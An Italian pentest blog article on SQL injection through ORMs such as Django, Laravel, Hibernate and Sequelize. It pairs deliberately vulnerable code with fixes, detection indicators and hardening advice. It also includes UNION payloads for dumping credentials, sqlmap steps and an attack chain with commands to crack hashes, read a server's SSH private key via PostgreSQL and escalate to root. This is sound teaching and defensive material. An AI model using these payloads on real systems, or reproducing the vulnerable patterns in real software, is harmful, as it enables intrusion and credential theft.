---
title: 'SQL Injection su ORM: Django, Laravel, Hibernate e Sequelize'
slug: sql-injection-orm
description: 'SQL Injection su ORM: vulnerabilità in Django, Laravel, Hibernate e Sequelize. Raw query, extra(), orderByRaw e exploitation reale con esempi pratici.'
image: '/ChatGPT Image 3 mar 2026, 20_44_06.webp'
draft: true
date: 2026-03-04T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - sql
---

# SQL Injection su ORM — "Uso un Framework, Sono Protetto" È la Bugia Più Pericolosa del 2026

"Non possiamo avere SQL Injection, usiamo Django ORM." L'ho sentito dire dal CTO di un'azienda che ho compromesso in 40 minuti. La verità: gli ORM (Object-Relational Mapping) come Django ORM, Laravel Eloquent, Hibernate, Sequelize e SQLAlchemy **proteggono dalla SQLi base** — il `.filter(id=user_input)` è parametrizzato. Ma nel momento in cui lo sviluppatore usa un **raw query**, un **extra()**, un **literal()**, un **query builder con concatenazione stringa** o un **order\_by con input non validato**, l'ORM non protegge più niente.

La SQL Injection su ORM è una delle vulnerabilità più sottovalutate nelle applicazioni moderne basate su framework come Django, Laravel, Hibernate e Sequelize.

E succede in ogni progetto che vedo. La trovo nel **22% dei pentest su applicazioni con ORM** — percentuale che sorprende tutti perché "il framework dovrebbe proteggerci". Il framework protegge se lo usi correttamente. Il problema è che ci sono decine di modi per usarlo scorrettamente, e gli sviluppatori ne trovano sempre di nuovi.

Satellite operativo della [guida pillar SQL Injection](https://hackita.it/articoli/sql-injection). Qui copro ogni ORM maggiore con i pattern vulnerabili specifici, i comandi per testarli e le fix.

Un caso che racconto nei corsi: applicazione SaaS su Django/PostgreSQL, 100% Django ORM nei modelli, code review con Bandit e Semgrep → zero finding. Ma un endpoint di ricerca usava `QuerySet.extra(where=[f"name LIKE '%{query}%'"])` perché il developer "non riusciva a fare la query con il filter standard". `query = %' UNION SELECT username,password,3,4 FROM auth_user--` → dump utenti admin. Il code review automatico non aveva flaggato `extra()` perché era "Django ORM", non un `raw()`.

## Cos'è la SQL Injection su ORM?

La SQL Injection su ORM è una vulnerabilità che si verifica quando un'applicazione che utilizza un Object-Relational Mapping (Django ORM, Hibernate, Sequelize, Laravel Eloquent, SQLAlchemy) inserisce input utente non sanitizzato in **raw query**, **query builder con interpolazione stringa**, o **funzioni ORM che accettano SQL letterale** (come `extra()`, `RawSQL()`, `literal()`, `whereRaw()`). L'ORM protegge dai pattern standard, ma queste funzionalità avanzate bypassano la parametrizzazione.

> **La SQL Injection su ORM è pericolosa?**
> Sì — l'impatto è identico alla SQLi classica: data breach completo, bypass autenticazione, RCE. La pericolosità aggiuntiva è il **falso senso di sicurezza**: i team credono di essere protetti dall'ORM e non testano per SQLi. Trovata nel **22% dei pentest su applicazioni con ORM** nel 2025-2026.

## Come Verificare se La Tua Applicazione è Vulnerabile

```bash
# Code review — cerca pattern pericolosi:

# Django
grep -rn "raw\|extra\|RawSQL\|cursor.execute" --include="*.py" /app/
grep -rn "f\".*SELECT\|f\".*WHERE\|\.format.*SELECT" --include="*.py" /app/

# Laravel
grep -rn "whereRaw\|selectRaw\|DB::raw\|DB::select\|DB::statement" --include="*.php" /app/
grep -rn "orderByRaw\|groupByRaw\|havingRaw" --include="*.php" /app/

# Hibernate/Java
grep -rn "createQuery\|createNativeQuery\|createSQLQuery" --include="*.java" /app/
grep -rn "String.*SELECT.*+.*request\|\" +.*WHERE" --include="*.java" /app/

# Sequelize
grep -rn "sequelize.query\|Sequelize.literal\|sequelize.literal" --include="*.js" --include="*.ts" /app/
grep -rn "replacements.*\`\|order.*\[\[.*req\." --include="*.js" --include="*.ts" /app/
```

## 1. Django ORM — Pattern Vulnerabili

### ❌ raw() con concatenazione

```python
# VULNERABILE
def search_users(request):
    query = request.GET.get('q')
    users = User.objects.raw(f"SELECT * FROM auth_user WHERE username LIKE '%{query}%'")
    return render(request, 'results.html', {'users': users})
```

**Injection:** `q=%' UNION SELECT 1,username,password,4,5,6,7,8 FROM auth_user--`

### ❌ extra() con interpolazione

```python
# VULNERABILE
def filter_products(request):
    sort = request.GET.get('sort', 'name')
    products = Product.objects.extra(order_by=[sort])
    # Se sort = "name; DELETE FROM products--" → SQLi
    
    # Peggio ancora:
    name_filter = request.GET.get('name')
    products = Product.objects.extra(where=[f"name LIKE '%{name_filter}%'"])
```

### ❌ RawSQL in annotate

```python
# VULNERABILE
from django.db.models.expressions import RawSQL
sort_field = request.GET.get('sort')
Product.objects.annotate(custom=RawSQL(f"CASE WHEN {sort_field} IS NOT NULL THEN 1 ELSE 0 END", [])).order_by('custom')
```

### ❌ cursor.execute con f-string

```python
# VULNERABILE
from django.db import connection
def get_stats(request):
    table = request.GET.get('table')
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT COUNT(*) FROM {table}")  # Table name injection
```

### ✅ Versione sicura

```python
# SICURO — parametrizzato
User.objects.raw("SELECT * FROM auth_user WHERE username LIKE %s", [f'%{query}%'])

# SICURO — ORM filter
Product.objects.filter(name__icontains=query).order_by('name')

# SICURO — whitelist per order_by
ALLOWED_SORTS = {'name', 'price', 'date', '-name', '-price', '-date'}
sort = request.GET.get('sort', 'name')
if sort in ALLOWED_SORTS:
    products = Product.objects.order_by(sort)
```

## 2. Laravel Eloquent — Pattern Vulnerabili

### ❌ whereRaw / selectRaw / orderByRaw

```php
// VULNERABILE
$search = $request->input('search');
$users = DB::table('users')->whereRaw("name LIKE '%$search%'")->get();

// VULNERABILE
$sort = $request->input('sort');
$products = Product::orderByRaw($sort)->get();

// VULNERABILE
$column = $request->input('column');
$users = User::selectRaw("$column, COUNT(*) as total")->groupBy($column)->get();
```

**Injection:** `search=%' UNION SELECT username,password FROM users--`

### ❌ DB::raw() in select

```php
// VULNERABILE
$field = $request->input('field');
$data = DB::table('orders')->select(DB::raw($field))->get();
```

### ❌ DB::select() / DB::statement()

```php
// VULNERABILE
$id = $request->input('id');
$result = DB::select("SELECT * FROM users WHERE id = $id");
```

### ✅ Versione sicura

```php
// SICURO — binding
$users = DB::table('users')->whereRaw("name LIKE ?", ["%$search%"])->get();

// SICURO — Eloquent
$users = User::where('name', 'LIKE', "%$search%")->get();

// SICURO — whitelist order
$allowed = ['name', 'price', 'date'];
$sort = in_array($request->input('sort'), $allowed) ? $request->input('sort') : 'name';
$products = Product::orderBy($sort)->get();
```

## 3. Hibernate (Java) — Pattern Vulnerabili

### ❌ HQL/JPQL con concatenazione

```java
// VULNERABILE — HQL injection
String username = request.getParameter("username");
Query query = session.createQuery("FROM User WHERE username = '" + username + "'");
List<User> users = query.list();
```

**Injection:** `username=' OR '1'='1' --`

### ❌ Native query con concatenazione

```java
// VULNERABILE
String sort = request.getParameter("sort");
Query query = session.createNativeQuery("SELECT * FROM users ORDER BY " + sort);
```

### ❌ Criteria API con literal

```java
// VULNERABILE (raro ma possibile)
String filter = request.getParameter("filter");
CriteriaBuilder cb = session.getCriteriaBuilder();
Predicate p = cb.isTrue(cb.literal(filter)); // Se filter è SQL → injection
```

### ✅ Versione sicura

```java
// SICURO — parametrizzato
Query query = session.createQuery("FROM User WHERE username = :username");
query.setParameter("username", username);

// SICURO — Criteria API
CriteriaBuilder cb = session.getCriteriaBuilder();
Predicate p = cb.equal(root.get("username"), username);
```

## 4. Sequelize (Node.js) — Pattern Vulnerabili

### ❌ sequelize.query con template literal

```javascript
// VULNERABILE
const search = req.query.search;
const users = await sequelize.query(`SELECT * FROM users WHERE name LIKE '%${search}%'`);
```

### ❌ Sequelize.literal

```javascript
// VULNERABILE
const sort = req.query.sort;
const products = await Product.findAll({
    order: [[Sequelize.literal(sort), 'ASC']]  // sort = injection point
});
```

### ❌ where con Op e literal

```javascript
// VULNERABILE
const { Op } = require('sequelize');
const filter = req.query.filter;
const data = await Model.findAll({
    where: sequelize.literal(filter)  // filter = SQL arbitrario
});
```

### ✅ Versione sicura

```javascript
// SICURO — replacements
const users = await sequelize.query(
    "SELECT * FROM users WHERE name LIKE :search",
    { replacements: { search: `%${search}%` }, type: QueryTypes.SELECT }
);

// SICURO — ORM standard
const products = await Product.findAll({
    where: { name: { [Op.iLike]: `%${search}%` } },
    order: [['name', 'ASC']]  // hardcoded, non da input
});

// SICURO — whitelist sort
const allowedSorts = ['name', 'price', 'createdAt'];
const sort = allowedSorts.includes(req.query.sort) ? req.query.sort : 'name';
const products = await Product.findAll({ order: [[sort, 'ASC']] });
```

## 5. SQLAlchemy (Python) — Pattern Vulnerabili

```python
# ❌ VULNERABILE — text() con f-string
from sqlalchemy import text
result = session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# ❌ VULNERABILE — order_by con text()
sort = request.args.get('sort')
result = session.query(User).order_by(text(sort)).all()

# ✅ SICURO — bindparam
result = session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})

# ✅ SICURO — column object
from sqlalchemy import asc
allowed = {'name': User.name, 'email': User.email}
sort_col = allowed.get(request.args.get('sort'), User.name)
result = session.query(User).order_by(asc(sort_col)).all()
```

## 6. 🏢 Enterprise Escalation

```
ORM SQLi → dump auth_user (Django) / users (Laravel) → admin hash
→ crack → admin panel → debug toolbar esposto → RCE
→ Django management command → shell
→ Server → AD enumeration → Kerberoasting → Domain Admin
```

**Tempo reale:** 40-90 minuti. L'escalation post-SQLi è identica indipendentemente dall'ORM.

## 7. 🔌 Variante Microservizi 2026

Nei microservizi, ogni servizio ha il suo ORM:

* API Gateway (Node.js/Sequelize)
* User Service (Python/Django)
* Payment Service (Java/Hibernate)
* Analytics Service (Python/SQLAlchemy)

L'attaccante trova il servizio con il raw query più debole. Spesso è il servizio **analytics/reporting** perché le query di reportistica sono complesse e gli sviluppatori usano raw query.

```json
// Analytics endpoint con raw query per report custom
POST /api/v2/analytics/custom-report
{
    "dimensions": ["date", "category"],
    "metrics": ["revenue", "count"],
    "groupBy": "date, category",  // → passa a raw SQL
    "filter": "category = 'electronics'"  // → concatenato in WHERE
}
```

## 8. Micro Playbook Reale

**Minuto 0-10 → Code review rapido (se grey/white box)**

```bash
grep -rn "raw\|Raw\|whereRaw\|literal\|createNativeQuery\|cursor.execute" /app/ --include="*.py" --include="*.php" --include="*.java" --include="*.js"
```

**Minuto 10-20 → Test parametri sort/order/group**

```bash
# Questi sono i vettori #1 sugli ORM
?sort=name → OK
?sort=name' → errore?
?sort=name,SLEEP(3) → delay?
```

**Minuto 20-35 → SQLMap sui parametri vulnerabili**

```bash
sqlmap -u "URL?sort=name" -p sort --batch --level=5
```

**Minuto 35-40 → Dump e escalation**

```bash
sqlmap ... --dbs → --tables → --dump
```

**Shell in 40 minuti** anche su applicazioni con ORM.

## 9. Caso Studio Concreto

**Settore:** SaaS B2B, Django/PostgreSQL, 500 aziende clienti.

**Scope:** Pentest applicativo, grey-box con accesso al codice.

Code review con Semgrep e Bandit → zero finding SQLi. Ma grep manuale per `extra(` → trovato in `views/search.py`:

```python
products = Product.objects.extra(where=[f"name LIKE '%{query}%'"])
```

Test: `query=%' UNION SELECT 1,username,password,4,5,6,7 FROM auth_user--` → dump di 50 account admin. L'hash più vecchio era MD5 (account migrato da un sistema legacy), craccato in 1 secondo. Login admin → Django admin panel → potrei vedere i dati di tutte le 500 aziende clienti.

Dalla Django admin, ho notato che `DEBUG=True` era attivo → accesso alla Django Debug Toolbar → database query viewer → potevo eseguire query arbitrarie dal browser. Ma la vera escalation: il server aveva la chiave SSH per il deploy in `/home/deploy/.ssh/id_rsa` (leggibile via `INTO OUTFILE` alternative su PostgreSQL) → SSH al server di produzione → root via sudo misconfigurato.

**Tempo dalla prima injection alla shell root:** 40 minuti. **Il tool automatico non aveva trovato nulla.** La grep manuale per `extra(` ha trovato la vuln in 30 secondi.

## 10. Errori Comuni Reali

**1. "Usiamo ORM, siamo sicuri" — il falso senso di sicurezza**
L'errore più pericoloso. L'ORM protegge i metodi standard (`.filter()`, `.where()`), non i raw query, extra(), literal() e order\_by con input utente.

**2. ORDER BY con input utente (ogni ORM, ogni framework)**
SQL non parametrizza ORDER BY. L'unica soluzione è la whitelist. Ma gli sviluppatori passano `sort=request.input('sort')` direttamente → injection.

**3. Raw query per "query complesse"**
"Il filter standard non supporta questa query, uso raw." Il raw query bypassa tutta la protezione dell'ORM.

**4. SAST che non flagga le funzioni ORM pericolose**
Semgrep, Bandit, SonarQube hanno regole per `cursor.execute()` con f-string ma spesso non per `extra()`, `RawSQL()`, `Sequelize.literal()`, `whereRaw()`.

**5. Migration di sistemi legacy con raw query**
Vecchie query SQL copiate dal sistema legacy e messe dentro l'ORM come raw query senza refactoring.

## 11. Indicatori di Compromissione (IoC)

* **Errori ORM anomali** nei log — `OperationalError`, `ProgrammingError` con payload SQL nell'input
* **Query anomale nel query log** — UNION, SLEEP in query generate dall'ORM
* **Accesso a tabelle di sistema** — `information_schema`, `pg_catalog`, `sqlite_master` da query applicative
* **Request con payload SQL** nei parametri `sort`, `order`, `groupBy`, `filter` — log WAF/API Gateway
* **Django Debug Toolbar** accessibile in produzione — `/__debug__/` con query viewer

## 12. Mini Chain Offensiva Reale

```
Django extra() SQLi → auth_user Dump → MD5 Hash Crack → Admin Panel → DEBUG=True → SSH Key Read → Shell Root
```

**Step 1 → extra() injection**

```bash
curl "https://target.com/api/search?q=%25'+UNION+SELECT+1,username,password,4,5,6,7+FROM+auth_user--"
```

**Step 2 → Crack hash**

```bash
hashcat -m 0 md5_hash.txt rockyou.txt  # 1 secondo
```

**Step 3 → Admin access**

```bash
curl -c cookies.txt -X POST https://target.com/admin/login/ \
  -d "username=admin&password=cracked_pass&csrfmiddlewaretoken=TOKEN"
```

**Step 4 → RCE via DEBUG toolbar o file read**

```bash
# Se PostgreSQL superuser:
# COPY (SELECT '') TO PROGRAM 'cat /home/deploy/.ssh/id_rsa' → estrai chiave
ssh -i stolen_key deploy@target.com
sudo su  # → root
```

## Detection & Hardening

* **Ban raw query** — policy di team: nessun `raw()`, `extra()`, `whereRaw()`, `literal()` senza review
* **Whitelist per ORDER BY** — l'unica soluzione sicura
* **SAST custom rules** — aggiungi regole Semgrep/SonarQube per le funzioni ORM pericolose
* **Code review** — grep manuale per pattern pericolosi prima di ogni release
* **Principio minimo privilegio** — l'utente DB dell'ORM non deve avere FILE, EXECUTE, superuser
* **DEBUG=False** in produzione — Django, Flask, Express

## Mini FAQ

**Quale ORM è il più sicuro?**
Tutti gli ORM sono sicuri se usati correttamente. Django ORM e SQLAlchemy hanno la superficie di attacco più piccola nei metodi standard. Ma tutti hanno escape hatch (raw, extra, literal) che bypassano la protezione. L'ORM più sicuro è quello usato senza raw query.

**I tool SAST trovano SQLi su ORM?**
Trovano `cursor.execute()` con f-string e `raw()` con concatenazione. Ma spesso non trovano `extra()`, `RawSQL()`, `whereRaw()`, `Sequelize.literal()`. Servono regole custom e code review manuale.

**ORDER BY è davvero non parametrizzabile?**
Corretto — SQL non permette `ORDER BY ?` come prepared statement. L'unica soluzione è la **whitelist**: valida il valore di sort contro una lista di colonne permesse. Ogni framework ha il suo modo di farlo.

***

Vedi la [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection). Vedi anche: [SQLi Classica](https://hackita.it/articoli/sql-injection-classica), [Blind SQLi](https://hackita.it/articoli/blind-sql-injection), [Time-Based SQLi](https://hackita.it/articoli/time-based-sql-injection), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest).

***

Se vuoi testare davvero la sicurezza della tua applicazione o delle API della tua azienda, puoi richiedere un **penetration test applicativo HackIta**:\
[https://hackita.it/servizi](https://hackita.it/servizi)

Se invece vuoi imparare davvero a trovare e sfruttare vulnerabilità come SQL Injection su framework moderni (Django, Laravel, Hibernate, Sequelize) puoi farlo con la **formazione 1:1 HackIta**:\
[https://hackita.it/formazione](https://hackita.it/formazione)

Se vuoi supportare il progetto HackIta:\
[https://hackita.it/supporto](https://hackita.it/supporto)

***

## Riferimenti

* [https://owasp.org/www-community/attacks/SQL\_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* [https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
